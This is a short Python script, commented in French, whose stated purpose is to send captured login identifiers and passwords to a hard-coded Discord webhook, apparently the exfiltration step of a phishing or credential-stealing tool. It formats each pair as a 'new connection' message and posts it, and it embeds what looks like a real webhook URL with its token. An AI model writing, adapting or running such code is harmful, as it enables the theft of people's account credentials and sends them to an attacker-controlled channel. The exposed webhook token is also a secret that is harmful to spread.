import urllib.parse
import urllib.request
import json

# URL de votre webhook Discord
WEBHOOK_URL = 'https://discord.com/api/webhooks/1230858497973944320/HEMmUnUTZzThhSNCXbgisUzi7ygn88zF2gTxactU2i1GjkAMlYkzz_w3SY-6h44tFGw4'

# Fonction pour envoyer les identifiants et mots de passe au webhook Discord
def envoyer_au_webhook(identifiant, mot_de_passe):
    message = f'Nouvelle connexion :\nIdentifiant : {identifiant}\nMot de passe : {mot_de_passe}'
    payload = {'content': message}
    try:
        # Encodage des données à envoyer
        data = json.dumps(payload).encode('utf-8')

        # Envoi de la requête POST au webhook Discord
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
        response = urllib.request.urlopen(req)
        
        if response.getcode() == 204:
            print('Données envoyées au webhook Discord avec succès.')
        else:
            print(f'Erreur lors de l\'envoi des données au webhook Discord. Code d\'erreur : {response.getcode()}')
    except Exception as e:
        print('Erreur lors de l\'envoi des données au webhook Discord :', e)

# Exemple d'utilisation de la fonction envoyer_au_webhook
identifiant = 'utilisateur@example.com'
mot_de_passe = 'MotDePasse123'

envoyer_au_webhook(identifiant, mot_de_passe)
